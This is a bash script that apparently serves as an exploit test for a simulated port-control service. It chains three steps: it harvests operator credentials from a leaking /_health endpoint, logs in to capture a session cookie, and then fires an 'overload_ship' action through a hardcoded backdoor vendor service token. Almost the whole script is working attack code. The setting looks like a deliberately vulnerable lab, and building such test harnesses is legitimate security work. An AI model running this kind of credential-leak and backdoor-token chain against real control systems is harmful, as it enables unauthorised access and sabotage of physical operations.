#!/usr/bin/env bash
# One-shot overload test. Pulls the live operator creds from the leaked
# /_health endpoint (so it works regardless of what's in the running
# container's env), logs in, picks the first docked ship, and fires the
# vendor-backdoor overload action against it. Usage:
#   ./scripts/test-overload.sh                       # default: +30 against 127.0.0.1:18090
#   ./scripts/test-overload.sh 50                    # custom count
#   ./scripts/test-overload.sh 50 http://host:18090  # custom count + target
#
# Override creds explicitly:
#   PORT_OPERATOR_USERNAME=foo PORT_OPERATOR_PASSWORD=bar ./scripts/test-overload.sh
set -euo pipefail

COUNT="${1:-30}"
BASE="${2:-http://127.0.0.1:18090}"
TOKEN="PORT-SVC-9c2f4e1a-LEGACY"

echo "target : $BASE"
echo "count  : +$COUNT past capacity"

# 0. If creds weren't set in the environment, pull them out of /_health —
#    the verbose-health endpoint leaks both username and password.
if [ -z "${PORT_OPERATOR_USERNAME:-}" ] || [ -z "${PORT_OPERATOR_PASSWORD:-}" ]; then
  echo "creds  : (probing /_health for live values)"
  HEALTH=$(curl -sk "$BASE/_health" || true)
  if [ -z "$HEALTH" ]; then
    echo "ERROR: /_health unreachable — is the container running on $BASE?" >&2
    exit 1
  fi
  CREDS=$(python3 -c "
import sys, json
c = json.loads(sys.stdin.read()).get('config', {})
print(c.get('operator_username',''))
print(c.get('operator_password',''))
" <<<"$HEALTH")
  USER=$(printf '%s\n' "$CREDS" | sed -n '1p')
  PASS=$(printf '%s\n' "$CREDS" | sed -n '2p')
else
  USER="$PORT_OPERATOR_USERNAME"
  PASS="$PORT_OPERATOR_PASSWORD"
fi

if [ -z "$USER" ] || [ -z "$PASS" ]; then
  echo "ERROR: could not determine operator credentials" >&2
  exit 1
fi
echo "creds  : $USER / $PASS"

# 1. Login — capture the session cookie value from Set-Cookie. We can't use
#    curl's cookie jar reliably because the cookie may be set Secure when
#    PORT_TRUST_PROXY=1 and we're on http. Capture full headers so we can
#    diagnose if login is rejected.
LOGIN_HDRS=$(curl -sk -X POST "$BASE/login" \
  --data-urlencode "username=$USER" \
  --data-urlencode "password=$PASS" \
  -D - -o /dev/null)

SESS=$(printf '%s\n' "$LOGIN_HDRS" \
  | sed -n 's/^[Ss]et-[Cc]ookie: port_session=\([^;]*\).*/\1/p' | tr -d '\r' | head -n1)

if [ -z "$SESS" ]; then
  STATUS=$(printf '%s\n' "$LOGIN_HDRS" | sed -n '1s/.*HTTP\/[0-9.]* \([0-9]*\).*/\1/p' | head -n1)
  LOC=$(printf '%s\n' "$LOGIN_HDRS" | sed -n 's/^[Ll]ocation: //p' | tr -d '\r' | head -n1)
  echo "ERROR: login failed — no session cookie returned" >&2
  echo "  tried   : $USER / $PASS" >&2
  echo "  status  : ${STATUS:-?}" >&2
  echo "  location: ${LOC:-(none)}" >&2
  case "$LOC" in
    */login\?error=locked*)
      echo "  cause   : rate-limited. Reset with: docker compose restart control" >&2 ;;
    */login\?error=1*)
      echo "  cause   : server rejected username/password — re-check /_health" >&2 ;;
    "")
      echo "  cause   : no Location header — server may not be running login route" >&2 ;;
    *)
      echo "  cause   : unexpected redirect — full headers below:" >&2
      printf '%s\n' "$LOGIN_HDRS" | sed 's/^/    /' >&2 ;;
  esac
  exit 1
fi
echo "session: ${SESS:0:24}…"

# 2. Find a docked ship
SHIP=$(curl -s -H "Cookie: port_session=$SESS" "$BASE/api/state" \
  | python3 -c "import sys,json; s=json.load(sys.stdin); print(next((x['id'] for x in s['ships'] if x['status'] in ('docking','working')),''))")

if [ -z "$SHIP" ]; then
  echo "ERROR: no ships are docked or working — wait for one to arrive and retry" >&2
  exit 2
fi
echo "ship   : $SHIP"

# 3. Fire the overload via the leaked vendor token
echo
echo "── overload response ──"
curl -s -X POST "$BASE/api/svc/exec" \
  -H "X-Service-Token: $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"action\":\"overload_ship\",\"ship_id\":\"$SHIP\",\"count\":$COUNT,\"actor\":\"test-overload\"}"
echo
